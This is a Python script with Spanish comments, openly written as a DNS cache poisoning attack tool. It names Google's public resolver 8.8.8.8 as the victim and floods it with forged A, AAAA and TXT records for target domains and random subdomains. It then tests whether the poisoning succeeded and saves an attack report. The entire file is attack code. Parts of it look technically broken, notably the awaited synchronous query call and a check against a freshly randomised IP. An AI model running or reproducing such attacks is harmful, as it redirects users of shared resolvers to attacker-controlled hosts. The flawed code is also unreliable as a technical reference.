import dns.message
import dns.query
import dns.resolver
import random
import time
import socket
import logging
import json
import asyncio
import sys
import os
from datetime import datetime

# Configuración de logging
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")

# Información de configuración y objetivos
TARGET_DOMAINS = ["example.com", "targetsite.com", "maliciousdomain.net"]  # Múltiples dominios objetivo
MALICIOUS_IP = "192.168.100.100"  # IP maliciosa base
DNS_SERVER = "8.8.8.8"  # Servidor DNS víctima
RECORD_TYPES = ["A", "AAAA", "TXT"]  # Tipos de registros DNS maliciosos a variar

# Parámetros de variación
CACHE_TTL_MIN = 60
CACHE_TTL_MAX = 3600  # TTL dinámico entre 1 minuto y 1 hora

# Información sobre el sistema
def get_system_info():
    system_info = {
        "Sistema operativo": os.name,
        "Plataforma": sys.platform,
        "Arquitectura": os.uname(),
        "Versión Python": sys.version,
    }
    return system_info

# Función para generar una IP maliciosa dinámica
def generate_malicious_ip():
    """Genera una IP maliciosa aleatoria dentro de un rango definido."""
    return f"192.168.100.{random.randint(1, 255)}"

# Función para generar un subdominio aleatorio
def generate_random_subdomain(domain):
    """Genera un subdominio aleatorio para simular tráfico más realista."""
    subdomain = f"{random.randint(1, 100000)}.{domain}"
    return subdomain

# Función para generar un mensaje DNS falso
def generate_fake_dns_response(domain, malicious_ip, record_type="A", ttl=None):
    """Genera una respuesta DNS falsa para el dominio objetivo y tipo de registro especificado."""
    if ttl is None:
        ttl = random.randint(CACHE_TTL_MIN, CACHE_TTL_MAX)  # TTL dinámico

    response = dns.message.make_response(dns.message.make_query(domain, dns.rdatatype.ANY))
    
    if record_type == "A":
        answer = dns.rrset.from_text(domain, ttl, dns.rdataclass.IN, dns.rdatatype.A, malicious_ip)
    elif record_type == "AAAA":
        fake_ipv6 = "2001:0db8:85a3:0000:0000:8a2e:0370:7334"
        answer = dns.rrset.from_text(domain, ttl, dns.rdataclass.IN, dns.rdatatype.AAAA, fake_ipv6)
    elif record_type == "TXT":
        answer = dns.rrset.from_text(domain, ttl, dns.rdataclass.IN, dns.rdatatype.TXT, '"malicious data"')

    response.answer.append(answer)
    return response

# Función para inyectar la respuesta falsa
async def inject_poisoned_cache(dns_server, fake_response):
    """Inyecta la respuesta falsa en la caché del servidor DNS objetivo."""
    try:
        await dns.query.tcp(fake_response, dns_server)
        logging.info(f"Respuesta falsa inyectada a {dns_server} con éxito.")
    except Exception as e:
        logging.error(f"Error al inyectar la respuesta falsa: {e}")

# Función para realizar el ataque de envenenamiento de caché con subdominios aleatorios y tráfico iterativo
async def perform_cache_poisoning_attack(dns_server, target_domains, malicious_ip, num_queries=100):
    """Realiza un ataque de envenenamiento de caché (Cache Poisoning Attack) con subdominios aleatorios y tráfico iterativo."""
    logging.info(f"Comenzando el ataque de envenenamiento de caché contra {dns_server}...")
    
    tasks = []
    for domain in target_domains:
        record_type = random.choice(RECORD_TYPES)  # Elegir aleatoriamente el tipo de registro (A, AAAA, TXT)
        subdomain = generate_random_subdomain(domain)
        logging.info(f"Inyectando registros maliciosos en el subdominio: {subdomain} con tipo de registro {record_type}")

        for _ in range(num_queries):
            fake_response = generate_fake_dns_response(subdomain, malicious_ip, record_type)
            # Crear tareas asincrónicas para enviar respuestas maliciosas
            tasks.append(inject_poisoned_cache(dns_server, fake_response))

    # Ejecutar todas las tareas asincrónicas de inyección
    await asyncio.gather(*tasks)
    logging.info(f"Ataque de envenenamiento de caché completado en {dns_server}.")

# Función para detectar la presencia del ataque de envenenamiento de caché
async def detect_cache_poisoning(dns_server, target_domains):
    """Detecta si el servidor DNS ha sido envenenado al verificar la resolución de múltiples dominios objetivos."""
    attack_detected = False
    try:
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [dns_server]
        
        for domain in target_domains:
            subdomain = generate_random_subdomain(domain)
            answer = resolver.resolve(subdomain)
            if answer[0].address == generate_malicious_ip():
                logging.warning(f"Cache Poisoning detectado en {dns_server}! El subdominio {subdomain} ahora apunta a {generate_malicious_ip()}.")
                attack_detected = True
            else:
                logging.info(f"{subdomain} resuelto correctamente en {dns_server}. Sin indicios de envenenamiento.")
    except Exception as e:
        logging.error(f"Error al detectar envenenamiento de caché: {e}")
    return attack_detected

# Función para registrar los resultados en un archivo JSON
def generate_attack_report(target_domains, dns_server, attack_results, system_info):
    """Genera un informe detallado del ataque de envenenamiento de caché."""
    report = {
        "Fecha": str(datetime.now()),
        "Sistema": system_info,
        "DNS Victim Server": dns_server,
        "Dominios objetivo": target_domains,
        "IP maliciosa": MALICIOUS_IP,
        "Resultados del ataque": attack_results,
    }

    report_filename = "cache_poisoning_attack_report.json"
    with open(report_filename, "w") as f:
        json.dump(report, f, indent=4)

    logging.info(f"Informe generado y guardado en {report_filename}.")

# Función principal para ejecutar el ataque y las verificaciones
async def main():
    try:
        # Información del sistema
        system_info = get_system_info()

        # Realizar el ataque de envenenamiento de caché
        attack_results = {}
        attack_results["Ataque iniciado"] = str(datetime.now())
        await perform_cache_poisoning_attack(DNS_SERVER, TARGET_DOMAINS, MALICIOUS_IP)

        # Verificar si el envenenamiento de caché fue exitoso
        attack_results["Ataque completado"] = str(datetime.now())
        poisoning_detected = await detect_cache_poisoning(DNS_SERVER, TARGET_DOMAINS)
        
        if poisoning_detected:
            attack_results["Resultado"] = "Éxito"
        else:
            attack_results["Resultado"] = "Fracaso"
        
        # Generar el informe detallado
        generate_attack_report(TARGET_DOMAINS, DNS_SERVER, attack_results, system_info)

    except KeyboardInterrupt:
        logging.info("\nAtaque interrumpido por el usuario.")
    except Exception as e:
        logging.error(f"Error inesperado: {e}")

if __name__ == "__main__":
    asyncio.run(main())
